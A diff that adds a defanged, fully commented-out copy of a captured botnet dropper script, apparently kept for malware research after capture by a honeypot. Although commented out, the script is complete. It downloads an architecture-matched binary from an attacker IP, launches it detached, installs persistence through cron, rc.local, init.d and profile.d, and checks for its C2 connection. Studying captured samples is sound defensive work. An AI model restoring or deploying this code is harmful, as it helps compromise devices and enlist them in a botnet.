@@ -1,0 +1,164 @@
+# ============================================================================
+# DEFANGED FOR RESEARCH - DO NOT RUN. Every line of the original is commented
+# out and network indicators are defanged (hxxp, [.]).
+# Original: persist.sh version 3, 5952 bytes
+# SHA-256:  ac62a1dfc283429341b99196d974da0a18ffe4f4e30ac28eb4e9583aed4b592f
+# Captured: KSI Digital Cowrie honeypot, served from hxxp://89.163.157[.]131:8080/persist.sh
+# ============================================================================
+
+# #!/bin/sh
+# # ancient telnet persistence payload - PURE ASCII ONLY.
+# # old busybox shells choke on multi-byte UTF-8, so no em-dashes, no box chars.
+# #
+# # served at hxxp://89.163.157[.]131:8080/persist.sh
+# #
+# # the dir-picking uses the mount-scoring approach from the reference
+# # TELNET_PERSIST_PAYLOAD.sh: score every writable mount by filesystem type
+# # (journalled flash beats tmpfs), so the bot lands somewhere that SURVIVES
+# # A REBOOT, not /tmp which is wiped.
+#
+# HOST=89.163.157[.]131
+# PORT=8080
+#
+# # ---- 1. pick the most durable writable partition -------------------------
+# # score /proc/mounts: ext4 > ext3 > ext2 > jffs2 > ubifs/yaffs > vfat,
+# # and boost the dirs devices actually persist across reboots.
+# persist_dir=""
+# best_score=-1
+# while read dev mnt fstype opts rest; do
+#     case "$fstype" in
+#         ext4)               score=10 ;;
+#         ext3)               score=9  ;;
+#         ext2)               score=8  ;;
+#         jffs2)              score=7  ;;
+#         ubifs|yaffs2|yaffs) score=6  ;;
+#         vfat|fat|exfat)     score=5  ;;
+#         *) continue ;;
+#     esac
+#     case "$mnt" in
+#         /data)    score=$((score+5)) ;;
+#         /etc)     score=$((score+5)) ;;
+#         /mnt/mtd) score=$((score+5)) ;;
+#         /cache)   score=$((score+4)) ;;
+#         /mnt)     score=$((score+3)) ;;
+#     esac
+#     if [ -w "$mnt" ] && [ "$score" -gt "$best_score" ]; then
+#         best_score=$score
+#         persist_dir="$mnt"
+#     fi
+# done < /proc/mounts
+#
+# # never prefer bare / - a dedicated data dir (even on the same fs) is safer
+# # because / can be remounted read-only. only fall back to / if nothing else.
+# if [ "$persist_dir" = "/" ]; then
+#     for d in /data /mnt/mtd /etc /cache /var/tmp /tmp /dev/shm; do
+#         if [ -w "$d" ]; then persist_dir="$d"; break; fi
+#     done
+# fi
+#
+# [ -z "$persist_dir" ] && persist_dir="/tmp"
+#
+# # ---- 2. pick the arch-matched binary -------------------------------------
+# ARCH=`uname -m 2>/dev/null`
+# case "$ARCH" in
+#     aarch64|arm64|armv8*|armv9*)   BIN=arm8   ;;
+#     armv7*|armv7l)                 BIN=arm7   ;;
+#     armv6*|armv6l)                 BIN=arm6   ;;
+#     armv5*|armv5l|armv5tejl)       BIN=arm5   ;;
+#     armv4*|armv4l)                 BIN=arm4   ;;
+#     mips64el|mips64*)              BIN=mips   ;;
+#     mipsel|mips*el*)               BIN=mpsl   ;;
+#     mips)                          BIN=mips   ;;
+#     x86_64|amd64)                  BIN=x86_64 ;;
+#     i386|i486|i586|i686|x86|ia32)  BIN=x86    ;;
+#     m68k)                          BIN=m68k   ;;
+#     ppc64|ppc|powerpc*)            BIN=ppc    ;;
+#     sh4|sh)                        BIN=sh4    ;;
+#     *)                             BIN=x86_64 ;;
+# esac
+#
+# URL="hxxp://$HOST:$PORT/$BIN"
+#
+# # ---- 3. download into the best dir, then fall back ----------------------
+# # the persist dir is tried first; if the download fails there, walk the usual
+# # writable spots. first one that holds a real binary wins.
+# for DIR in "$persist_dir" /tmp /var/tmp /dev/shm /data /cache /run /dev /; do
+#     [ -w "$DIR" ] || continue
+#     cd "$DIR" 2>/dev/null || continue
+#     OUT="$DIR/.ancient"
+#     rm -f "$OUT" 2>/dev/null
+#
+#     wget "$URL" -O "$OUT" 2>/dev/null
+#     [ -s "$OUT" ] || busybox wget "$URL" -O "$OUT" 2>/dev/null
+#     [ -s "$OUT" ] || curl "$URL" -o "$OUT" 2>/dev/null
+#     [ -s "$OUT" ] || busybox curl "$URL" -o "$OUT" 2>/dev/null
+#     [ -s "$OUT" ] || toybox wget "$URL" -O "$OUT" 2>/dev/null
+#
+#     SZ=`wc -c < "$OUT" 2>/dev/null`
+#     [ -z "$SZ" ] && SZ=0
+#
+#     if [ "$SZ" -gt 100000 ]; then
+#         chmod 777 "$OUT" 2>/dev/null
+#
+#         # already running? never launch a second copy. this is NOT a confirmed
+#         # load - the existing process may be a dead leftover - so it gets its
+#         # own marker, not ANCIENT_STARTED.
+#         if ps w 2>/dev/null | grep -v grep | grep -q "\.ancient"; then
+#             echo "ANCIENT_SKIP $BIN $SZ already_running"
+#             exit 0
+#         fi
+#         if command -v pgrep >/dev/null 2>&1 && pgrep -f "\.ancient" >/dev/null 2>&1; then
+#             echo "ANCIENT_SKIP $BIN $SZ already_running"
+#             exit 0
+#         fi
+#
+#         # launch detached so it survives the telnet session closing (SIGHUP)
+#         if command -v setsid >/dev/null 2>&1; then
+#             setsid "$OUT" >/dev/null 2>&1 &
+#         elif command -v nohup >/dev/null 2>&1; then
+#             nohup "$OUT" >/dev/null 2>&1 &
+#         else
+#             "$OUT" >/dev/null 2>&1 &
+#         fi
+#
+#         # ---- 4. reboot persistence --------------------------------------
+#         # cron (user + system)
+#         (crontab -l 2>/dev/null; echo "*/5 * * * * $OUT") | crontab - 2>/dev/null
+#         echo "*/5 * * * * $OUT" >> /etc/crontab 2>/dev/null
+#         echo "*/5 * * * * $OUT" >> /var/spool/cron/root 2>/dev/null
+#         echo "*/5 * * * * $OUT" >> /var/spool/cron/crontabs/root 2>/dev/null
+#
+#         # rc.local
+#         if [ -f /etc/rc.local ]; then
+#             grep -q "$OUT" /etc/rc.local 2>/dev/null || echo "$OUT >/dev/null 2>&1 &" >> /etc/rc.local
+#         fi
+#
+#         # init.d
+#         if [ -d /etc/init.d ]; then
+#             printf '#!/bin/sh\n%s\n' "$OUT" > /etc/init.d/.ancient 2>/dev/null
+#             chmod 755 /etc/init.d/.ancient 2>/dev/null
+#         fi
+#
+#         # profile.d
+#         if [ -d /etc/profile.d ]; then
+#             printf '%s &\n' "$OUT" > /etc/profile.d/.ancient.sh 2>/dev/null
+#             chmod 644 /etc/profile.d/.ancient.sh 2>/dev/null
+#         fi
+#
+#         # ---- 5. verify the C2 connection ---------------------------------
+#         # /proc/net/tcp shows the PORT as plain hex (the kernel ntohs()s it):
+#         # 35342 = 0x8A0E -> ":8A0E". (the IP is byte-reversed there, the port
+#         # is NOT.) give the bot up to 8s to establish the connection.
+#         sleep 8
+#         if cat /proc/net/tcp /proc/net/tcp6 2>/dev/null | grep -q ":8A0E"; then
+#             echo "ANCIENT_STARTED $BIN $SZ connected"
+#         else
+#             echo "ANCIENT_NOCONN $BIN $SZ launched_but_not_connected"
+#         fi
+#         exit 0
+#     fi
+#     rm -f "$OUT" 2>/dev/null
+# done
+#
+# echo "ANCIENT_FAIL no_binary"
+# exit 0
